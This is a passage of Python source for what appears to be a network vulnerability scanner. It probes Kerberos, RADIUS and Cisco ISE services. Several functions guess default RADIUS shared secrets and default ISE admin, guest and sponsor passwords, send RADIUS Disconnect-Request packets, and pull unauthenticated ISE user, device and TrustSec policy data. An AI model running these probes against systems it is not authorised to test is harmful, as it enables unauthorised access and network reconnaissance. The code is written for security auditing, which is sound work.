                                    # [6] EXPLICIT — skip tag+len, grab inner INTEGER
                                    inner_start = i + 2
                                    if resp[inner_start] == 0x02:
                                        int_len = resp[inner_start + 1]
                                        val = 0
                                        for b in resp[inner_start + 2:inner_start + 2 + int_len]:
                                            val = (val << 8) | b
                                        err_code = val
                                        break
                                i += 1
                        except Exception:
                            pass
                        if err_code == 25:
                            findings.append({
                                'severity': 'MEDIUM',
                                'title':    'KERBEROS_PREAUTH_REQUIRED',
                                'detail':   (
                                    f'Kerberos KDC on {host}:{port} returned '
                                    f'KDC-ERR-PREAUTH-REQUIRED (error 25) — pre-authentication '
                                    f'is enforced (expected secure posture).  Service is live '
                                    f'and accepting AS-REQ traffic; Kerberoasting of service '
                                    f'accounts remains possible with valid credentials.'
                                ),
                                'host':     host,
                                'port':     port,
                            })
        except socket.timeout:
            pass
        except Exception:
            pass
    except Exception:
        pass
    finally:
        try:
            sock.close()
        except Exception:
            pass

    # -----------------------------------------------------------------------
    # Step 3: UDP port 88 reachability (send AS-REQ without TCP length prefix)
    # -----------------------------------------------------------------------
    if not port88_open:
        try:
            udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_sock.settimeout(timeout)
            # UDP AS-REQ has no 4-byte length prefix
            udp_payload = as_req[4:]
            udp_sock.sendto(udp_payload, (host, port))
            data, _ = udp_sock.recvfrom(4096)
            if data:
                findings.append({
                    'severity': 'HIGH',
                    'title':    'KERBEROS_PORT_OPEN',
                    'detail':   (
                        f'Kerberos authentication service is accessible on {host}:{port} (UDP). '
                        f'Exposes authentication infrastructure to AS-REP roasting, Kerberoasting, '
                        f'and brute-force attacks from unauthenticated network positions.'
                    ),
                    'host':     host,
                    'port':     port,
                })
                first_byte = data[0] if data else 0
                if first_byte == 0x6b:
                    findings.append({
                        'severity': 'CRITICAL',
                        'title':    'KERBEROS_NOPREAUTH',
                        'detail':   (
                            f'Kerberos KDC on {host}:{port} (UDP) returned AS-REP without '
                            f'requiring pre-authentication.  AS-REP Roasting attack applicable.'
                        ),
                        'host':     host,
                        'port':     port,
                    })
                elif first_byte == 0x7e:
                    findings.append({
                        'severity': 'MEDIUM',
                        'title':    'KERBEROS_PREAUTH_REQUIRED',
                        'detail':   (
                            f'Kerberos KDC on {host}:{port} (UDP) returned '
                            f'KDC-ERR-PREAUTH-REQUIRED — pre-authentication enforced.'
                        ),
                        'host':     host,
                        'port':     port,
                    })
        except Exception:
            pass
        finally:
            try:
                udp_sock.close()
            except Exception:
                pass

    # -----------------------------------------------------------------------
    # Step 4: TCP port 464 — kpasswd service
    # -----------------------------------------------------------------------
    try:
        kp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        kp_sock.settimeout(timeout)
        kp_sock.connect((host, 464))
        findings.append({
            'severity': 'MEDIUM',
            'title':    'KPASSWD_PORT_OPEN',
            'detail':   (
                f'Kerberos password change service (kpasswd) is accessible on {host}:464 '
                f'(TCP/UDP).  Enables password-change requests and can be leveraged for '
                f'account enumeration or forced password resets in combination with valid '
                f'Kerberos tickets.'
            ),
            'host':     host,
            'port':     464,
        })
    except Exception:
        pass
    finally:
        try:
            kp_sock.close()
        except Exception:
            pass

    return findings


# ---------------------------------------------------------------------------
# RADIUS weak authentication probe
# ---------------------------------------------------------------------------
def probe_radius_weak_auth(host: str, port: int = 1812, timeout: float = 5.0) -> list:
    """Detect RADIUS authentication bypass via empty password or default shared secrets.

    Checks:
      - Access-Request with empty password + shared secret 'testing123' -> Access-Accept (CRITICAL)
      - Access-Request with each default secret -> any Access-Accept (CRITICAL)
      - Any RADIUS response (not timeout) -> HIGH (service responsive, brute-force surface)

    RADIUS uses UDP (SOCK_DGRAM, RFC 2865).
    Returns list of {severity, title, detail, host, port}.
    """
    import socket
    import struct
    import hashlib
    import os

    findings: list = []
    DEFAULT_SECRETS = ['testing123', 'secret', 'radius', 'cisco', 'radiussecret']

    def _build_access_request(secret: str, password: str) -> bytes:
        """Build a minimal RADIUS Access-Request packet (RFC 2865)."""
        code = 1          # Access-Request
        pkt_id = 1
        # 16-byte random authenticator
        authenticator = os.urandom(16)

        # Encode password: XOR padded password with MD5(secret + authenticator)
        pw_bytes = password.encode('utf-8')
        # Pad to nearest 16-byte boundary (minimum 16 bytes)
        padded_len = max(16, ((len(pw_bytes) + 15) // 16) * 16)
        pw_padded = pw_bytes.ljust(padded_len, b'\x00')
        # XOR with MD5(secret + authenticator) chain
        xor_key = hashlib.md5(secret.encode('utf-8') + authenticator).digest()
        encrypted_pw = bytes(a ^ b for a, b in zip(pw_padded[:16], xor_key))
        # If password > 16 bytes, chain additional blocks
        for i in range(16, padded_len, 16):
            xor_key = hashlib.md5(secret.encode('utf-8') + encrypted_pw[-16:]).digest()
            encrypted_pw += bytes(a ^ b for a, b in zip(pw_padded[i:i+16], xor_key))

        # Attribute 1: User-Name = 'anonymous'
        username = b'anonymous'
        attr_user = bytes([1, 2 + len(username)]) + username
        # Attribute 2: User-Password (encrypted)
        attr_pass = bytes([2, 2 + len(encrypted_pw)]) + encrypted_pw
        # Attribute 5: NAS-Port = 0
        attr_nas_port = bytes([5, 6]) + struct.pack('>I', 0)
        # Attribute 61: NAS-Port-Type = Virtual (5)
        attr_nas_type = bytes([61, 6]) + struct.pack('>I', 5)

        attrs = attr_user + attr_pass + attr_nas_port + attr_nas_type
        length = 20 + len(attrs)
        header = struct.pack('>BBH', code, pkt_id, length) + authenticator
        return header + attrs

    def _build_malformed_packet() -> bytes:
        """Build a syntactically malformed RADIUS packet for responsiveness check."""
        # Code=1, ID=99, Length=20 (no attributes), all-zero authenticator
        return struct.pack('>BBH', 1, 99, 20) + b'\x00' * 16

    def _send_radius(sock: 'socket.socket', packet: bytes, host: str, port: int,
                     timeout: float) -> bytes | None:
        try:
            sock.sendto(packet, (host, port))
            sock.settimeout(timeout)
            data, _ = sock.recvfrom(4096)
            return data
        except socket.timeout:
            return None
        except Exception:
            return None

    # -----------------------------------------------------------------------
    # Step 1: Empty password + 'testing123' shared secret
    # -----------------------------------------------------------------------
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        pkt = _build_access_request('testing123', '')
        resp = _send_radius(sock, pkt, host, port, timeout)
        if resp and resp[0] == 2:  # Access-Accept
            findings.append({
                'severity': 'CRITICAL',
                'title':    'RADIUS_EMPTY_PASSWORD_ACCEPT',
                'detail':   (
                    f'RADIUS server at {host}:{port} accepted an Access-Request with an '
                    f'empty password and shared secret "testing123".  Full authentication '
                    f'bypass: any user can gain network access without supplying a valid '
                    f'password.  Immediate remediation required.'
                ),
                'host':     host,
                'port':     port,
            })
    except Exception:
        pass
    finally:
        try:
            sock.close()
        except Exception:
            pass

    # -----------------------------------------------------------------------
    # Step 2: Default shared secret sweep
    # -----------------------------------------------------------------------
    accepted_secret = None
    for secret in DEFAULT_SECRETS:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            pkt = _build_access_request(secret, 'Password1!')
            resp = _send_radius(sock, pkt, host, port, timeout)
            if resp and resp[0] == 2:  # Access-Accept
                accepted_secret = secret
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'RADIUS_DEFAULT_SHARED_SECRET',
                    'detail':   (
                        f'RADIUS server at {host}:{port} accepts default shared secret '
                        f'"{secret}" (full auth bypass).  An attacker can craft valid '
                        f'RADIUS Access-Request packets using this secret to authenticate '
                        f'as any user or enumerate the authentication service.'
                    ),
                    'host':     host,
                    'port':     port,
                })
                break
        except Exception:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass

    # -----------------------------------------------------------------------
    # Step 3: Malformed packet responsiveness check
    # (only report if no Access-Accept already found — avoids duplicate noise)
    # -----------------------------------------------------------------------
    if accepted_secret is None:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            pkt = _build_malformed_packet()
            resp = _send_radius(sock, pkt, host, port, timeout)
            if resp is not None:
                findings.append({
                    'severity': 'HIGH',
                    'title':    'RADIUS_RESPONSIVE',
                    'detail':   (
                        f'RADIUS server at {host}:{port} is responding to unauthenticated '
                        f'probe packets (response code {resp[0] if resp else "unknown"}).  '
                        f'Service is reachable and actively processing requests — exposes '
                        f'shared-secret brute-force surface.  Verify shared secret strength '
                        f'and restrict NAS IP allow-list.'
                    ),
                    'host':     host,
                    'port':     port,
                })
        except Exception:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass

    return findings


def probe_ise_ers_api_exposure(host: str, port: int = 9060, timeout: float = 10.0) -> list:
    """
    Detect exposed Cisco ISE External RESTful Services (ERS) API.

    ERS API runs on dedicated HTTPS port 9060 and optionally on 443.
    Probes SDK discovery, resource collections without credentials,
    default Basic-auth credential brute-force, admin portal fingerprint,
    and version string disclosure.

    References: ISE 3.1 Install Guide ch5 (admin login/portal); ERS API
    default credentials established during setup (ch3: admin username + password).

    Returns list of {severity, title, detail, host, port}.
    """
    import re as _re

    findings: list = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(p: int, path: str) -> tuple:
        try:
            req = urllib.request.Request(
                f'https://{host}:{p}{path}',
                headers={'Accept': 'application/json'},
            )
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                return r.status, r.read(4096)
        except urllib.error.HTTPError as e:
            body = b''
            try:
                body = e.read(4096)
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, b''

    def _get_auth(p: int, path: str, user: str, pw: str) -> tuple:
        cred = base64.b64encode(f'{user}:{pw}'.encode()).decode()
        try:
            req = urllib.request.Request(
                f'https://{host}:{p}{path}',
                headers={
                    'Accept':        'application/json',
                    'Authorization': f'Basic {cred}',
                },
            )
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                return r.status, r.read(4096)
        except urllib.error.HTTPError as e:
            return e.code, b''
        except Exception:
            return None, b''

    # Determine reachable ERS port: prefer dedicated 9060, fall back to 443
    probe_port = port
    try:
        _s = socket.create_connection((host, port), timeout=timeout)
        _s.close()
    except Exception:
        probe_port = 443

    # 1. ERS SDK discovery endpoint — reveals full REST API surface
    status, body = _get(probe_port, '/ers/sdk')
    if status in (200, 301, 302, 401):
        sev = 'CRITICAL' if status == 200 else 'HIGH'
        findings.append({
            'severity': sev,
            'title':    'ISE_ERS_SDK_EXPOSED',
            'detail':   (
                f'GET https://{host}:{probe_port}/ers/sdk returned HTTP {status} — '
                f'ERS SDK discovery endpoint reachable; reveals full REST API surface '
                f'and resource URLs without credentials. '
                f'Preview: {body[:200].decode(errors="replace")}'
            ),
            'host': host,
            'port': probe_port,
        })

    # 2. Internal user list — ISE credential database exposure
    status, body = _get(probe_port, '/ers/config/internaluser')
    if status == 200 and body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_ERS_USERS_UNAUTH',
            'detail':   (
                f'GET /ers/config/internaluser returned HTTP 200 without credentials — '
                f'ISE internal user database exposed; yields usernames, passwords, and groups. '
                f'Preview: {body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': probe_port,
        })

    # 3. Network device list — full NAD topology disclosure
    status, body = _get(probe_port, '/ers/config/networkdevice')
    if status == 200 and body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_ERS_DEVICES_UNAUTH',
            'detail':   (
                f'GET /ers/config/networkdevice returned HTTP 200 without credentials — '
                f'complete Network Access Device list exposed; reveals all NAD IPs and RADIUS secrets. '
                f'Preview: {body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': probe_port,
        })

    # 4. Endpoint groups — policy topology disclosure
    status, body = _get(probe_port, '/ers/config/endpointgroup')
    if status == 200 and body:
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_ERS_ENDPOINT_GROUPS',
            'detail':   (
                f'GET /ers/config/endpointgroup returned HTTP 200 without credentials — '
                f'endpoint group policy structure disclosed. '
                f'Preview: {body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': probe_port,
        })

    # 5. Authorization profiles — policy configuration disclosure
    status, body = _get(probe_port, '/ers/config/authorizationprofile')
    if status == 200 and body:
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_ERS_AUTH_PROFILES',
            'detail':   (
                f'GET /ers/config/authorizationprofile returned HTTP 200 without credentials — '
                f'authorization policy profiles disclosed; reveals VLAN assignments and ACLs. '
                f'Preview: {body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': probe_port,
        })

    # 6. Default credential brute-force via Basic auth against ERS
    for _user, _pw in [('admin', 'admin'), ('admin', 'ISEisC00L'), ('guest', 'guest')]:
        status, body = _get_auth(probe_port, '/ers/config/internaluser', _user, _pw)
        if status == 200:
            findings.append({
                'severity': 'CRITICAL',
                'title':    'ISE_DEFAULT_CREDS',
                'detail':   (
                    f'ERS API authenticated with default credentials {_user}:{_pw} — '
                    f'full administrative API access obtained on port {probe_port}. '
                    f'Preview: {body[:200].decode(errors="replace")}'
                ),
                'host': host,
                'port': probe_port,
            })
            break

    # 7. Admin portal fingerprint on port 443
    status, body = _get(443, '/')
    if status is not None and b'Cisco Identity Services Engine' in body:
        findings.append({
            'severity': 'MEDIUM',
            'title':    'ISE_ADMIN_PORTAL',
            'detail':   (
                f'GET https://{host}:443/ contains "Cisco Identity Services Engine" string — '
                f'ISE admin portal fingerprinted without credentials.'
            ),
            'host': host,
            'port': 443,
        })

    # 8. Version disclosure — scan ERS SDK response for version markers
    status, body = _get(probe_port, '/ers/sdk')
    if body:
        for _pat in (
            rb'(?:ISE|IdentityServicesEngine)[_ -]?(\d+[\.\d]+)',
            rb'"version"\s*:\s*"([^"]{3,30})"',
            rb'release["\s:]+(\d+[\.\d]+)',
        ):
            _m = _re.search(_pat, body, _re.IGNORECASE)
            if _m:
                findings.append({
                    'severity': 'HIGH',
                    'title':    'ISE_VERSION_DISCLOSED',
                    'detail':   (
                        f'ISE version string extracted unauthenticated from ERS SDK endpoint: '
                        f'{_m.group(0).decode(errors="replace").strip()}'
                    ),
                    'host': host,
                    'port': probe_port,
                })
                break

    return findings


def probe_ise_guest_portal_exposure(host: str, port: int = 8443, timeout: float = 10.0) -> list:
    """
    Detect exposed Cisco ISE guest/sponsor portals and ancillary services.

    Probes guest and sponsor portal setup pages, tests default portal
    credentials, checks RADIUS CoA listener (UDP 3799/1700), pxGrid REST
    API on port 8910, the ISE Profiler REST API, and the MnT (Monitoring
    and Troubleshooting) active session list on port 443.

    References: ISE 3.1 post-install guide ch5 (admin/web access); ISE
    default username 'admin' set during setup (ch3 setup parameters).

    Returns list of {severity, title, detail, host, port}.
    """
    import os as _os
    import re as _re

    findings: list = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(h_port: int, path: str) -> tuple:
        try:
            req = urllib.request.Request(f'https://{host}:{h_port}{path}')
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                return r.status, r.read(8192)
        except urllib.error.HTTPError as e:
            body = b''
            try:
                body = e.read(8192)
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, b''

    def _post_form(h_port: int, path: str, fields: dict) -> tuple:
        data = urllib.parse.urlencode(fields).encode()
        try:
            req = urllib.request.Request(
                f'https://{host}:{h_port}{path}',
                data=data,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                method='POST',
            )
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                return r.status, r.read(8192)
        except urllib.error.HTTPError as e:
            body = b''
            try:
                body = e.read(8192)
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, b''

    # 1. Guest portal setup page
    status, body = _get(port, '/portal/PortalSetup.action')
    if status in (200, 302):
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_GUEST_PORTAL_EXPOSED',
            'detail':   (
                f'GET https://{host}:{port}/portal/PortalSetup.action returned HTTP {status} — '
                f'ISE guest portal is publicly reachable; enables guest account self-registration.'
            ),
            'host': host,
            'port': port,
        })
        # Parse portal version string from body
        _mv = _re.search(rb'(?:ISE|version)[^\d]*(\d+\.\d+[\.\d]*)', body, _re.IGNORECASE)
        if _mv:
            findings.append({
                'severity': 'MEDIUM',
                'title':    'ISE_PORTAL_VERSION',
                'detail':   (
                    f'ISE portal version string extracted unauthenticated: '
                    f'{_mv.group(0).decode(errors="replace").strip()}'
                ),
                'host': host,
                'port': port,
            })

    # 2. Sponsor portal setup page
    status, _ = _get(port, '/sponsorportal/PortalSetup.action')
    if status in (200, 302):
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_SPONSOR_PORTAL_EXPOSED',
            'detail':   (
                f'GET https://{host}:{port}/sponsorportal/PortalSetup.action returned HTTP {status} — '
                f'ISE sponsor portal is publicly reachable; sponsors create and manage guest accounts.'
            ),
            'host': host,
            'port': port,
        })

    # 3. Default credential probe via portal login form
    _portal_exposed = any(
        f['title'] in ('ISE_GUEST_PORTAL_EXPOSED', 'ISE_SPONSOR_PORTAL_EXPOSED')
        for f in findings
    )
    if _portal_exposed:
        for _u, _p, _ptype in [
            ('guest',   'guest',   'guest'),
            ('sponsor', 'sponsor', 'sponsor'),
        ]:
            status, body = _post_form(
                port, '/portal/Login.action',
                {'username': _u, 'password': _p, 'portalMode': _ptype},
            )
            # Success indicators: no redirect back to login, dashboard/logout markers
            _body_lc = body.lower()
            if status == 200 and (
                b'dashboard' in _body_lc or
                b'logout' in _body_lc or
                (b'login' not in _body_lc and len(body) > 2048)
            ):
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'ISE_PORTAL_DEFAULT_CREDS',
                    'detail':   (
                        f'POST /portal/Login.action authenticated with default credentials '
                        f'{_u}:{_p} on port {port} — portal access obtained without valid account.'
                    ),
                    'host': host,
                    'port': port,
                })
                break

    # 4. RADIUS CoA / Disconnect-Request probe (UDP 3799 and legacy 1700)
    # Code=40 (Disconnect-Request), ID=0, Length=20, random Authenticator
    _coa_auth = _os.urandom(16)
    _coa_pkt = struct.pack('!BBH16s', 40, 0, 20, _coa_auth)
    for _coa_port in (3799, 1700):
        _coa_sock = None
        try:
            _coa_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            _coa_sock.settimeout(timeout)
            _coa_sock.sendto(_coa_pkt, (host, _coa_port))
            _coa_data, _ = _coa_sock.recvfrom(4096)
            _resp_code = _coa_data[0] if _coa_data else 0
            findings.append({
                'severity': 'HIGH',
                'title':    'ISE_RADIUS_COA_EXPOSED',
                'detail':   (
                    f'RADIUS CoA listener at UDP {host}:{_coa_port} responded to '
                    f'Disconnect-Request probe (response code {_resp_code}) — '
                    f'CoA port is network-reachable; attacker with shared secret can '
                    f'forcibly disconnect active sessions.'
                ),
                'host': host,
                'port': _coa_port,
            })
            break
        except socket.timeout:
            pass
        except Exception:
            pass
        finally:
            if _coa_sock is not None:
                try:
                    _coa_sock.close()
                except Exception:
                    pass

    # 5. pxGrid TLS reachability on port 8910
    _pxgrid_port = 8910
    _pxgrid_reachable = False
    _pxgrid_raw = None
    try:
        _pxgrid_raw = socket.create_connection((host, _pxgrid_port), timeout=timeout)
        try:
            _pxgrid_tls = ctx.wrap_socket(_pxgrid_raw, server_hostname=host)
            _pxgrid_tls.close()
        except ssl.SSLError:
            try:
                _pxgrid_raw.close()
            except Exception:
                pass
        _pxgrid_reachable = True
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_PXGRID_EXPOSED',
            'detail':   (
                f'TLS connection to {host}:{_pxgrid_port} accepted — '
                f'pxGrid 2.0 control bus is network-reachable; subscriber '
                f'session and endpoint data may be accessible to unregistered clients.'
            ),
            'host': host,
            'port': _pxgrid_port,
        })
    except Exception:
        pass
    finally:
        if _pxgrid_raw is not None:
            try:
                _pxgrid_raw.close()
            except Exception:
                pass

    # 6. pxGrid REST API AccessSecret — unauthenticated secret endpoint
    if _pxgrid_reachable:
        _px_status, _px_body = _get(_pxgrid_port, '/pxgrid/control/AccessSecret')
        if _px_status in (200, 400):
            _sev = 'CRITICAL' if _px_status == 200 else 'HIGH'
            findings.append({
                'severity': _sev,
                'title':    'ISE_PXGRID_API_UNAUTH',
                'detail':   (
                    f'GET https://{host}:{_pxgrid_port}/pxgrid/control/AccessSecret returned '
                    f'HTTP {_px_status} — pxGrid control REST API reachable without valid client cert. '
                    f'Preview: {_px_body[:200].decode(errors="replace")}'
                ),
                'host': host,
                'port': _pxgrid_port,
            })

    # 7. Profiler REST API on port 8910
    if _pxgrid_reachable:
        _prof_status, _prof_body = _get(_pxgrid_port, '/profiler/api/v1')
        if _prof_status in (200, 401):
            findings.append({
                'severity': 'HIGH',
                'title':    'ISE_PROFILER_API_EXPOSED',
                'detail':   (
                    f'GET https://{host}:{_pxgrid_port}/profiler/api/v1 returned '
                    f'HTTP {_prof_status} — ISE Profiler REST API is network-reachable; '
                    f'device profiling data and endpoint classifications may be accessible. '
                    f'Preview: {_prof_body[:200].decode(errors="replace")}'
                ),
                'host': host,
                'port': _pxgrid_port,
            })

    # 8. MnT (Monitoring & Troubleshooting) active session list on port 443
    _mnt_status, _mnt_body = _get(443, '/admin/API/mnt/Session/ActiveList')
    if _mnt_status == 200 and _mnt_body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_MNT_SESSIONS_UNAUTH',
            'detail':   (
                f'GET https://{host}:443/admin/API/mnt/Session/ActiveList returned HTTP 200 '
                f'without credentials — active network session list exposed; reveals every '
                f'authenticated endpoint, user identity, IP, and MAC on the network. '
                f'Preview: {_mnt_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': 443,
        })

    return findings


def probe_ise_trustsec_sgt_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """
    Detect Cisco ISE TrustSec / Security Group Tag (SGT) policy exposure.

    Probes ERS API SGT resource endpoints for unauthenticated access, tests
    the SXP (Security Group Exchange Protocol) TCP listener on port 64999,
    queries the pxGrid REST API for TrustSec capability disclosure, and checks
    the DNA Center NDS group integration endpoint.

    TrustSec microsegmentation relies on SGT assignments being confidential;
    exposing the policy matrix gives an attacker the full lateral-movement map
    of which device classes can reach which other classes, enabling targeted
    bypass of zero-trust segmentation controls.

    References: Cisco ISE 3.1 Admin Guide (TrustSec ch); RFC 7348 (VXLAN SGT
    transport); Cisco TrustSec Configuration Guide (SXP protocol, SGT ERS API).

    Returns list of {severity, title, detail, host, port}.
    """
    findings: list = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(p: int, path: str, extra_headers: dict = None) -> tuple:
        hdrs = {'Accept': 'application/json'}
        if extra_headers:
            hdrs.update(extra_headers)
        try:
            req = urllib.request.Request(f'https://{host}:{p}{path}', headers=hdrs)
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                return r.status, r.read(8192)
        except urllib.error.HTTPError as e:
            body = b''
            try:
                body = e.read(4096)
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, b''

    # ------------------------------------------------------------------
    # 1. SGT list — full segmentation policy enumeration
    # ------------------------------------------------------------------
    _status, _body = _get(port, '/ers/config/sgt?size=100&page=1')
    if _status == 200 and _body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_SGT_LIST_UNAUTH',
            'detail':   (
                f'GET https://{host}:{port}/ers/config/sgt returned HTTP 200 without '
                f'credentials — full Security Group Tag list exposed; reveals the complete '
                f'TrustSec segmentation policy (SGT names, values, and descriptions). '
                f'An attacker can enumerate all device/user trust classes and target '
                f'gaps in the micro-segmentation matrix. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # 2. SGT ACL list — policy rule enumeration
    # ------------------------------------------------------------------
    _status, _body = _get(port, '/ers/config/sgacl?size=100&page=1')
    if _status == 200 and _body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_SGACL_UNAUTH',
            'detail':   (
                f'GET https://{host}:{port}/ers/config/sgacl returned HTTP 200 without '
                f'credentials — Security Group ACL list exposed; discloses permit/deny rules '
                f'applied between SGT pairs, exposing the full TrustSec policy enforcement '
                f'surface to an unauthenticated attacker. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # 3. Egress policy matrix — SGT-to-SGT enforcement map
    # ------------------------------------------------------------------
    _status, _body = _get(port, '/ers/config/egressmatrixcell?size=100&page=1')
    if _status == 200 and _body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_POLICY_MATRIX_UNAUTH',
            'detail':   (
                f'GET https://{host}:{port}/ers/config/egressmatrixcell returned HTTP 200 '
                f'without credentials — SGT-to-SGT egress policy matrix exposed; reveals '
                f'which trust classes are permitted to communicate, providing a complete '
                f'lateral-movement map of the zero-trust segmentation boundary. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # 4. SGT range allocation
    # ------------------------------------------------------------------
    _status, _body = _get(port, '/ers/config/sgtrangebysgt?size=100&page=1')
    if _status == 200 and _body:
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_SGT_RANGES_UNAUTH',
            'detail':   (
                f'GET https://{host}:{port}/ers/config/sgtrangebysgt returned HTTP 200 '
                f'without credentials — SGT range allocation table exposed; discloses '
                f'the numeric tag value space assigned to each security group. '
                f'Preview: {_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # 5. SXP port reachability (TCP 64999)
    # ------------------------------------------------------------------
    _sxp_port = 64999
    _sxp_open = False
    try:
        _s = socket.create_connection((host, _sxp_port), timeout=timeout)
        _sxp_open = True
        _s.close()
    except Exception:
        pass

    if _sxp_open:
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_SXP_PORT_OPEN',
            'detail':   (
                f'TCP port {_sxp_port} (SXP — Security Group Exchange Protocol) is open on '
                f'{host}; SXP distributes SGT-to-IP bindings between TrustSec peers. '
                f'An unauthenticated TCP connection to SXP may expose binding tables or '
                f'allow injection of spoofed tag mappings.'
            ),
            'host': host,
            'port': _sxp_port,
        })

        # SXP Open message probe (version 1, type OPEN, length 16)
        _SXP_OPEN = b'\x00\x00\x00\x10\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x04'
        try:
            _s2 = socket.create_connection((host, _sxp_port), timeout=timeout)
            _s2.sendall(_SXP_OPEN)
            _resp = _s2.recv(64)
            _s2.close()
            if _resp and len(_resp) >= 4:
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'ISE_SXP_RESPONSIVE',
                    'detail':   (
                        f'SXP listener on {host}:{_sxp_port} responded to an unauthenticated '
                        f'OPEN message ({len(_resp)} bytes) — confirms SXP session negotiation '
                        f'without credential exchange; SGT-to-IP binding table may be readable. '
                        f'Response hex: {_resp[:32].hex()}'
                    ),
                    'host': host,
                    'port': _sxp_port,
                })
        except Exception:
            pass

    # ------------------------------------------------------------------
    # 6. pxGrid REST API — TrustSec capability discovery
    # ------------------------------------------------------------------
    _pxg_status, _pxg_body = _get(8910, '/pxgrid/control/getCapabilities',
                                   extra_headers={'Content-Type': 'application/json'})
    if _pxg_status == 200 and _pxg_body:
        findings.append({
            'severity': 'HIGH',
            'title':    'PXGRID_CAPABILITIES_UNAUTH',
            'detail':   (
                f'GET https://{host}:8910/pxgrid/control/getCapabilities returned HTTP 200 '
                f'without credentials — pxGrid capability list exposed; discloses all '
                f'registered pxGrid services and their topics. '
                f'Preview: {_pxg_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': 8910,
        })
        # Check for TrustSec topic in capabilities response
        if b'TrustSec' in _pxg_body or b'trustsec' in _pxg_body.lower():
            findings.append({
                'severity': 'CRITICAL',
                'title':    'PXGRID_TRUSTSEC_TOPIC',
                'detail':   (
                    f'pxGrid capability response on {host}:8910 contains TrustSec topic — '
                    f'unauthenticated access to TrustSec SGT/policy data stream confirmed; '
                    f'an attacker can subscribe to live binding updates. '
                    f'Preview: {_pxg_body[:300].decode(errors="replace")}'
                ),
                'host': host,
                'port': 8910,
            })

    # ------------------------------------------------------------------
    # 7. NDS group integration (Cisco DNA Center)
    # ------------------------------------------------------------------
    _nds_status, _nds_body = _get(port, '/ers/config/ndsgroup?size=100&page=1')
    if _nds_status == 200 and _nds_body:
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_NDS_GROUPS_UNAUTH',
            'detail':   (
                f'GET https://{host}:{port}/ers/config/ndsgroup returned HTTP 200 without '
                f'credentials — Cisco DNA Center NDS group integration configuration exposed; '
                f'reveals DNA Center connectivity settings and group policy mapping. '
                f'Preview: {_nds_body[:300].decode(errors="replace")}'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_ise_posture_policy_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """
    Detect Cisco ISE posture and device compliance policy exposure.

    Probes ISE ERS API endpoints for posture assessment configuration,
    posture profiles, compliance policies, BYOD/AD integration settings,
    device profiler rules, endpoint identity groups, and license metadata.

    Posture data is load-bearing to zero-trust enforcement: exposing posture
    profiles reveals exactly which compliance checks ISE enforces (AV version,
    patch level, firewall state), enabling an attacker to craft a device that
    satisfies every check and earns full network trust without genuine
    compliance. Endpoint identity group disclosure maps which device classes
    receive elevated authorization.

    References: Cisco ISE 3.1 Admin Guide (Posture ch, BYOD ch, Profiling ch);
    Cisco Zero Trust Architecture (Workplace and Workforce pillars; ISE posture
    as a trust signal in policy evaluation).

    Returns list of {severity, title, detail, host, port}.
    """
    findings: list = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(path: str) -> tuple:
        try:
            req = urllib.request.Request(
